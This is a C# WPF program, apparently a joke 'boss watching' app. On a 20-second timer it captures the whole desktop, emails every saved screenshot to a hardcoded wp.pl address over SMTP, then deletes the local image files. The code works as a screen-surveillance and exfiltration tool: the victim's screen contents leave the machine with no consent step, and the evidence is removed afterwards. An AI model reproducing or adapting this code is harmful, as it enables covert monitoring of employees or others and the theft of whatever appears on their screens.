using System;
using System.Configuration;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Windows;
using System.Windows.Media;
using System.Windows.Threading;

namespace PanieAreczkuWPF
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            Directory.CreateDirectory(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "/ScreenShoots");
            DispatcherTimer dispatcherTimer = new System.Windows.Threading.DispatcherTimer();
            dispatcherTimer.Tick += new EventHandler(MakeScreenShot);
            dispatcherTimer.Interval = new TimeSpan(0, 0, 20);
            dispatcherTimer.Start();

            dispatcherTimer.Tick += new EventHandler(SendEmail);
        }


        private void MakeScreenShot(object sender, EventArgs e)
        {
            var image = ScreenCapture.CaptureDesktop();
            image.Save(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + $@"/ScreenShoots/{DateTime.Now.ToString("yyyy-MM-ddTHH-mm-ss")}.jpg", ImageFormat.Jpeg);
            bool makeSound = bool.Parse(ConfigurationManager.AppSettings["MakeSound"]);
            if(makeSound)
                PlaySound();
        }
        private void PlaySound()
        {
            var uri = new Uri(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "/Resources/DARIO.mp3", UriKind.RelativeOrAbsolute);
            var player = new MediaPlayer();

            player.Open(uri);
            player.Play();
        }


        public static void SendEmail(object sender, EventArgs e)
        {
            try
            {
                string ToEmail = "panareczek.panareczek@wp.pl";
                string cc = "panareczek.panareczek@wp.pl";
                string bcc = "panareczek.panareczek@wp.pl";
                string Subj = "Panie Areczku co Pan robi!!!";
                string Message = "Tu Krystian";


                string[] fileNames = Directory.GetFiles(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + $@"/ScreenShoots");

                //Reading sender Email credential from web.config file  

                string HostAdd = ConfigurationManager.AppSettings["Host"].ToString();
                string FromEmailid = ConfigurationManager.AppSettings["FromMail"].ToString();
                string Pass = ConfigurationManager.AppSettings["Password"].ToString();

                //creating the object of MailMessage  
                MailMessage mailMessage = new MailMessage();
                mailMessage.From = new MailAddress(FromEmailid); //From Email Id  
                mailMessage.Subject = Subj; //Subject of Email  
                mailMessage.Body = Message; //body or message of Email  
                mailMessage.IsBodyHtml = true;



                foreach (var fileName in fileNames)
                {
                    byte[] file = File.ReadAllBytes(fileName);
                    MemoryStream stream1 = new MemoryStream(file);
                    //stream1.Write(file, 0, file.Length);
                    //stream1.Position = 0;
                    mailMessage.Attachments.Add(new Attachment(stream1, $"{fileName}.jpg"));
                }


                string[] ToMuliId = ToEmail.Split(',');
                foreach (string ToEMailId in ToMuliId)
                {
                    mailMessage.To.Add(new MailAddress(ToEMailId)); //adding multiple TO Email Id  
                }


                string[] CCId = cc.Split(',');

                foreach (string CCEmail in CCId)
                {
                    mailMessage.CC.Add(new MailAddress(CCEmail)); //Adding Multiple CC email Id  
                }

                string[] bccid = bcc.Split(',');

                foreach (string bccEmailId in bccid)
                {
                    mailMessage.Bcc.Add(new MailAddress(bccEmailId)); //Adding Multiple BCC email Id  
                }
                SmtpClient smtp = new SmtpClient();  // creating object of smptpclient  
                smtp.Host = HostAdd;             
                smtp.EnableSsl = true;

                NetworkCredential NetworkCred = new NetworkCredential();
                NetworkCred.UserName = mailMessage.From.Address;
                NetworkCred.Password = Pass;
                smtp.Credentials = NetworkCred;
                smtp.Port = 587;
                smtp.Send(mailMessage); //sending Email  

                foreach (var fileName in fileNames)
                {
                    File.Delete(fileName);
                }



            }
            catch (Exception ex)
            {

                File.WriteAllText(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + $"/Logi.txt", ex.ToString());

            }
        }
    }
}

